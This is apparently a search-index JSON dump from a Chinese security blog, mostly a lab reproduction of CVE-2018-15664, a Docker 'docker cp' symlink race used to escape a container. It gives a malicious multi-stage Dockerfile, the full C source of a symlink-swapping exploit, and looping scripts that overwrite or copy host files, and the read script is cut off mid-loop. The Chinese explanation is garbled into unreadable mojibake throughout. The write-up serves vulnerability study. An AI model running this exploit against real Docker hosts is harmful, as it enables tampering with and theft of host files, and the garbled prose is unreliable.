/www/xxx 685c2a289adf:/www/ //Â∞ÜÂÆπÂô®685c2a289adf‰∏ãÁöÑ/wwwÁõÆÂΩïÊã∑Ë¥ùÂà∞‰∏ªÊú∫ÁöÑ/tmpÁõÆÂΩï‰∏≠ docker cp 685c2a289adf:/www /tmp/ ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"ÊºèÊ¥û‰ªãÁªç Â≠òÂú®:18.06.1-ce-rc2ÁâàÊú¨Ââç‰∏≠ÁöÑDocker‰∏≠ docker cp ÂëΩ‰ª§ ÂØπÂ∫îÁöÑÂêéÁ´ØAPIÂ≠òÂú®Âü∫‰∫éÊù°‰ª∂Á´û‰∫âÁöÑÁ¨¶Âè∑ÈìæÊé•ÊõøÊç¢ÊºèÊ¥ûÔºåËÉΩÂ§üÂØºËá¥ÁõÆÂΩïÁ©øË∂ä„ÄÇ ÂèØ‰ª•Âà©Áî®Ê≠§ÊºèÊ¥ûÈÄÉÈÄ∏Âá∫ÂÆπÂô®ËØªÂèñÊàñÁØ°ÊîπhostÂÖ∂‰ªñ‰ªªÊÑèÂÆπÂô®ÂÜÖÁöÑÊñá‰ª∂„ÄÇ ÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™TOCTOUÔºàtime-of-check to time-of-useÔºâÔºå‰ΩøÁî®FollowSymlinkInScopeÂáΩÊï∞Êó∂Ëß¶ÂèëÊñá‰ª∂Á≥ªÁªüÁöÑÊù°‰ª∂Á´û‰∫âÁº∫Èô∑ÂØºËá¥ÔºåÂ±û‰∫éÁ´ûÊÄÅÊù°‰ª∂ÊºèÊ¥û Á´ûÊÄÅÊù°‰ª∂ÊºèÊ¥ûÔºåÂç≥Á®ãÂ∫èÂØπÊüêÂØπË±°ËøõË°åÂÆâÂÖ®Ê£ÄÊü•Âíå‰ΩøÁî®ËØ•ÂØπË±°ÁöÑÊ≠•È™§‰πãÈó¥Â≠òÂú®Èó¥ÈöôÔºåÊîªÂáªËÄÖÂèØ‰ª•ÂÖàÊûÑÈÄ†Âπ∂ÊîæÁΩÆ‰∏Ä‰∏™ËÉΩÂ§üÈÄöËøáÂÆâÂÖ®Ê£ÄÊü•ÁöÑÂêàÊ≥ïÂØπË±°ÔºåÈ°∫Âà©ÈÄöËøáÁõÆÊ†áÁ®ãÂ∫èÁöÑÂÆâÂÖ®Ê£ÄÊü•ÊµÅÁ®ãÔºåÁÑ∂ÂêéÂÜçÊâßË°å‰πãÂâçÁ´ãÂç≥‰ΩøÁî®ÊÅ∂ÊÑèÂØπË±°ÊõøÊç¢‰πãÈó¥ÁöÑÂêàÊ≥ïÂØπË±°„ÄÇ FollowSymlinkInScope‰ΩúÁî®:Ëß£ÊûêÂÆπÂô®ËøêË°å‰∏≠ËøêË°åËøõÁ®ãÁöÑÊñá‰ª∂Ë∑ØÂæÑ„ÄÇÊîªÂáªËÄÖÂ∞±Âà©Áî®Ëß£ÊûêÊ†°È™åÂÆåÊàê‰πãÂêéÂíåÊìç‰ΩúÊâßË°åÈó¥ÁöÑÁ©∫ÈöôÔºå‰øÆÊîπcpÊñá‰ª∂ÔºåÊîπ‰∏∫‰∏Ä‰∏™Á¨¶Âè∑ÈìæÊé•ÂØπÂ∫îÁöÑÁõÆÊ†áÊñá‰ª∂ Docker daemonÊî∂Âà∞docker cpÁöÑËØ∑Ê±ÇÔºå‰ºöÂØπÂ§çÂà∂ÁöÑË∑ØÂæÑËøõË°åÊ£ÄÊü•ÔºåÂ¶ÇÊûúË∑ØÂæÑ‰∏≠ÊúâÂÆπÂô®ÂÜÖÁöÑÁ¨¶Âè∑ÈìæÊé•ÔºåÂ∞±ÂÖàÂú®ÂÆπÂô®ÂÜÖÈÉ®Â∞ÜÂÖ∂Ëß£ÊûêÊàêË∑ØÂæÑÂ≠óÁ¨¶‰∏≤ÔºåÁïôÂæÖÂêéÁî® ÁúüÂÆûËøáÁ®ãÔºöDocker daemonÊ£ÄÊü•Â§çÂà∂Ë∑ØÂæÑÊó∂ÔºåÊîªÂáªËÄÖÊîæÁΩÆÊ≠£Â∏∏ÁöÑÈùûÁ¨¶Âè∑ËøûÊé•ÁöÑÂ∏∏ËßÑÊñá‰ª∂ÊàñÁõÆÂΩïÔºåÂú®Ê£ÄÊü•ÁªìÊùü‰πãÂêé„ÄÅdocker daemon‰ΩøÁî®Ë∑ØÂæÑÂâçÔºåÂ∞ÜÂÖ∂ÊõøÊç¢ÊàêÁ¨¶Âè∑ËøûÊé• Âà©Áî®Êù°‰ª∂Ôºö hackerÈúÄË¶ÅÊúâdocker cpÁöÑ‰ΩøÁî®ÊùÉÈôêÂíåÁõÆÊ†áÂÆπÂô®ÁöÑËÆøÈóÆÊùÉÈôê Ëß£ÊûêÊñá‰ª∂ÔºåÂà∞ÂÆåÊàêcpÁöÑÂä®‰ΩúÔºåÊòØÊØ´ÁßíÁ∫ßÔºåÊîªÂáªÈöæÂ∫¶ËæÉÂ§ß ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"Êê≠Âª∫ÁéØÂ¢É ‰ΩøÁî®MetargetÊèê‰æõÁöÑÈù∂Âú∫ÁéØÂ¢É git clone https://github.com/Metarget/metarget.git cd metarget ./metarget cnv install cve-2018-15664 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"poc: https://seclists.org/oss-sec/2019/q2/131 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"DockerFile Áî®Êù•Âà∂‰ΩúÊÅ∂ÊÑèÈïúÂÉè ÊûÑÂª∫ÊºèÊ¥ûÂà©Áî®Á®ãÂ∫èsymlink_swapÂπ∂Â∞ÜÂÖ∂ÊîæÂú®ÂÆπÂô®Ê†πÁõÆÂΩï‰∏ãÔºåÂπ∂Âú®Ê†πÁõÆÂΩïÂàõÂª∫‰∏Ä‰∏™w00t_w00t_im_ a_flagÊñá‰ª∂ÔºåÂÜÖÂÆπ‰∏∫FAlLED-INSIDE CONTAINER PATH ÂÆπÂô®ÂêØÂä®ÂêéÊâßË°å(Entrypoint)Âç≥‰∏∫/symlink_swap # Build the binary. #ÊãâÂèñsuse linuxÁöÑÂü∫Á°ÄÈïúÂÉè FROM opensuse/tumbleweed #ÂÆâË£Ögcc glibc-devel-static RUN zypper in -y gcc glibc-devel-static RUN mkdir /builddir #ÊûÑÂª∫ÊºèÊ¥ûÂà©Áî®Á®ãÂ∫èsymlink_swapÔºåÂπ∂Â∞ÜÂÖ∂ÊîæÂú®ÂÆπÂô®Ê†πÁõÆÂΩï‰∏ã COPY symlink_swap.c /builddir/symlink_swap.c RUN gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c # Set up our malicious rootfs. FROM opensuse/tumbleweed ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag ARG SYMSWAP_PATH=/totally_safe_path RUN echo \"FAILED -- INSIDE CONTAINER PATH\" \u003e\"$SYMSWAP_TARGET\" COPY --from=0 /builddir/symlink_swap /symlink_swap #ÂÆπÂô®ÂêØÂä®ÂêéÊâßË°åÁöÑÁ®ãÂ∫èÔºàEtrypointÔºâÂç≥‰∏∫/symlink_swap ENTRYPOINT [\"/symlink_swap\"] ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"Áü•ËØÜÁÇπÔºö Â§öÈò∂ÊÆµÊûÑÂª∫ Â§ö‰∏™FROMÊåá‰ª§‰∏çÊòØ‰∏∫‰∫ÜÁîüÊàêÂ§öÊ†πÁöÑÂ±ÇÂÖ≥Á≥ªÔºåÊúÄÂêéÁîüÊàêÁöÑÈïúÂÉèÔºå‰ªç‰ª•ÊúÄÂêé‰∏ÄÊù°FROM‰∏∫ÂáÜÔºå‰πãÂâçÁöÑË¢´ÊäõÂºÉ ÊØè‰∏™FROMÊåá‰ª§ÈÉΩÊòØ‰∏Ä‰∏™ÊûÑÂª∫Èò∂ÊÆµÔºåÂ§öÊù°FROMÂ∞±ÊòØÂ§öÈò∂ÊÆµÊûÑÂª∫„ÄÇËôΩÁÑ∂‰πãÂâçÁöÑFROM‰ºöË¢´ÊäõÂºÉÔºå‰ΩÜÊòØÂâçÁΩÆÈò∂ÊÆµÁöÑÊñá‰ª∂Êã∑Ë¥ùÂà∞ÂêéËæπÁöÑÈò∂ÊÆµ‰∏≠ÔºåËøôÂ∞±ÊòØÂ§öÈò∂ÊÆµÊûÑÂª∫ÁöÑÊúÄÂ§ßÊÑè‰πâ„ÄÇ ËøôÈáåÂÅöÂà∞ÁöÑÊïàÊûúÂ∞±ÊòØÂ∞ÜÁºñËØëÁéØÂ¢ÉÂíåËøêË°åÁéØÂ¢ÉÂàÜÁ¶ª ÊûÑÂª∫Èò∂ÊÆµËøòÂèØ‰ª•ËøõË°åÂëΩÂêçÔºåÂ¶Ç: # syntax=docker/dockerfile:1 FROM golang:1.16 AS builder WORKDIR /go/src/github.com/alexellis/href-counter/ RUN go get -d -v golang.org/x/net/html COPY app.go ./ RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . FROM alpine:latest RUN apk --no-cache add ca-certificates WORKDIR /root/ COPY --from=builder /go/src/github.com/alexellis/href-counter/app ./ CMD [\"./app\"] ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåÈò∂ÊÆµÊ≤°ÊúâÂëΩÂêçÔºåÂèØ‰ª•ÈÄöËøáÊï¥Êï∞Êù•ÂºïÁî®‰ªñ‰ª¨ÔºåÊï¥Êï∞‰ªé0ÂºÄÂßã„ÄÇ ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÂç≥‰Ωødokcerfile‰∏≠ÁöÑÊåá‰ª§ÂêéÈù¢ÈáçÊñ∞ÊéíÂ∫èÔºåCOPY‰πü‰∏ç‰ºö‰∏≠Êñ≠„ÄÇ ARG vs ENV argÊòØÂú®bulidÁöÑÊó∂ÂÄôÂ≠òÂú®ÔºåÂèØ‰ª•Âú®Dockerfile ‰∏≠ÂΩì‰ΩúÂèòÈáèÊù•‰ΩøÁî®(ARG‰∏ìÈó®‰∏∫ÊûÑÂª∫ÈïúÂÉèËÄåÁîü) envÊòØÂÆπÂô®ÊûÑÂª∫Â•Ω‰πãÂêéÁöÑÁéØÂ¢ÉÂèòÈáèÔºå‰∏çËÉΩÂú®Dockerfile‰∏≠ÂΩìÂèÇÊï∞‰ΩøÁî® Symlink_swap ÂÆπÂô®ÂÜÖÊºèÊ¥ûÂà©Áî®Ê∫ê‰ª£Á†Å Âú®ÂÆπÂô®ÂÜÖÂàõÂª∫ÊåáÂêëÊ†πÁõÆÂΩï‚Äù/‚ÄúÁöÑÁ¨¶Âè∑ÈìæÊé•ÔºåÂπ∂‰∏çÊñ≠ÁöÑ‰∫§Êç¢Á¨¶Âè∑ÈìæÊé•(Áî±ÂëΩ‰ª§Ë°åÂèÇÊï∞‰º†ÂÖ•ÔºåÂ¶Ç‚Äù/totally_safe_path‚ÄùÔºâ‰∏é‰∏Ä‰∏™Ê≠£Â∏∏ÁõÆÂΩï(‰æãÂ¶Ç‚Äù/totally_safe_path-stashed‚Äù)ÁöÑÂêçÂ≠ó„ÄÇËøôÊ†∑‰∏ÄÊù•ÔºåÂÆø‰∏ªÊú∫ÊâßË°ådocker cp Êó∂ÔºåÈ¶ñÂÖàÊ£ÄÊü•Âà∞‚Äù/totally_safe_path\"ÊòØ‰∏Ä‰∏™Ê≠£Â∏∏ÁõÆÂΩïÔºå‰ΩÜÊòØÂêéÈù¢ÊâßË°åÂ§çÂà∂Êìç‰ΩúÊó∂‚Äù/totally_safe_path\"Âç¥ÂèòÊàê‰∫Ü‰∏Ä‰∏™Á¨¶Âè∑ÈìæÊé•ÔºåÈÇ£‰πàDockerÂ∞ÜÂú®ÂÆø‰∏ªÊú∫Ëß£ÊûêËøô‰∏™Á¨¶Âè∑ÈìæÊé• #define _GNU_SOURCE #include \u003cfcntl.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003cunistd.h\u003e #define usage() \\ do { printf(\"usage: symlink_swap \u003csymlink\u003e\\n\"); exit(1); } while(0) #define bail(msg) \\ do { perror(\"symlink_swap: \" msg); exit(1); } while (0) /* No glibc wrapper for this, so wrap it ourselves. */ #define RENAME_EXCHANGE (1 \u003c\u003c 1) int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) { return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags); } /* usage: symlink_swap \u003csymlink\u003e */ int main(int argc, char **argv) { if (argc != 2) usage(); char *symlink_path = argv[1]; char *stash_path = NULL; if (asprintf(\u0026stash_path, \"%s-stashed\", symlink_path) \u003c 0) bail(\"create stash_path\"); /* Create a dummy file at symlink_path. */ struct stat sb = {0}; if (!lstat(symlink_path, \u0026sb)) { int err; if (sb.st_mode \u0026 S_IFDIR) err = rmdir(symlink_path); else err = unlink(symlink_path); if (err \u003c 0) bail(\"unlink symlink_path\"); } /* * Now create a symlink to \"/\" (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(\"/\", symlink_path) \u003c 0) bail(\"create symlink_path\"); if (mkdir(stash_path, 0755) \u003c 0) bail(\"mkdir stash_path\"); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = renameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err \u003c 0) perror(\"symlink_swap: rename exchange failed\"); } return 0; } Â±û‰∫éÁ´ûÊÄÅÊù°‰ª∂ÊºèÊ¥ûÔºå‰∏çÊòØÊØèÊ¨°ÈÉΩËÉΩÂ§çÁé∞Ôºå‰∏∫‰∫ÜÂ¢ûÂ§ßËß¶ÂèëÂá†ÁéáÔºåÈúÄË¶ÅÂú®ÂÆø‰∏ªÊú∫‰∏çÊñ≠ÊâßË°ådokcer cpÂëΩ‰ª§run_read.shÂíårun_write.shÊ®°ÊãüÂèóÂÆ≥ËÄÖÂú®ÂÆø‰∏ªÊú∫‰∏çÊñ≠ÊâßË°ådocker cp ÂëΩ‰ª§ run_write.sh ÂÆø‰∏ªÊú∫cpÂà∞ÂÆπÂô®ÂÜÖÁöÑÂú∫ÊôØÔºåËß¶ÂèëÊºèÊ¥ûÔºåÊåáÂÆöÁöÑÂÆø‰∏ªÊú∫Êñá‰ª∂Â∞ÜË¶ÜÁõñÂÆπÂô®ÂÜÖÊÅ∂ÊÑèÁ¨¶Âè∑ÈìæÊé• #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"FAILED -- HOST FILE UNCHANGED\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 0444 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") echo \"SUCCESS -- HOST FILE CHANGED\" | tee localpath # Now continually try to copy the files. while true do docker cp localpath \"${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET\" done run_read.sh Ê®°Êãüdocker cpÂ∞ÜÂÆπÂô®ÂÜÖÊñá‰ª∂Â§çÂà∂Âà∞ÂÆø‰∏ªÊú∫‰∏äÂú∫ÊôØÔºå‰∏ÄÊó¶Ëß¶ÂèëÔºåÂÆπÂô®ÂÜÖÊÅ∂ÊÑèÁ¨¶Âè∑ÈìæÊé•Âú®ÂÆø‰∏ªÊú∫Êñá‰ª∂Á≥ªÁªüËß£ÊûêÂêéÊâßË°åÁöÑÊñá‰ª∂Â∞ÜË¢´Â§çÂà∂Âà∞ÂèóÂÆ≥ËÄÖËÆæÂÆöÁöÑÂÆø‰∏ªÊú∫ÁõÆÂΩï‰∏ã #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"SUCCESS -- COPIED FROM THE HOST\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 000 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") # Now continually try to copy the files. idx=0 while true do mkdir \"ex${idx}\" ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:5","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":[],"content":" CTF Web„ÄÅMisc ‰ø°ÊÅØÂÆâÂÖ®Áà±Â•ΩËÄÖ ÁõÆÂâçÁ†îÁ©∂ÊñπÂêëwebÂÆâÂÖ®„ÄÅ‰∫ëÂéüÁîüÂÆâÂÖ® Èô§‰∫ÜÁîµËÑëÔºå‰ª£Á†ÅÔºåÁΩëÁªú‰πãÂ§ñÁöÑÁîüÊ¥ªÔºå‰πüÊòØË¶ÅËÆ§ÁúüÂØπÂæÖ„ÄÇ ËøòÊúâÂæàÈïøÁöÑË∑ØË¶ÅËµ∞Ôºå‰∏ÄÁõ¥Âú®Ë∑Ø‰∏ä„ÄÇ ","date":"2022-01-09","objectID":"/about/:0:0","tags":[],"title":"About","uri":"/about/"},{"categories":[],"content":" AmiaaaZ https://amiaaaz.github.io/ D3n13d https://d3n13d.github.io/ ","date":"2022-01-09","objectID":"/friends/:0:0","tags":[],"title":"Friends","uri":"/friends/"}]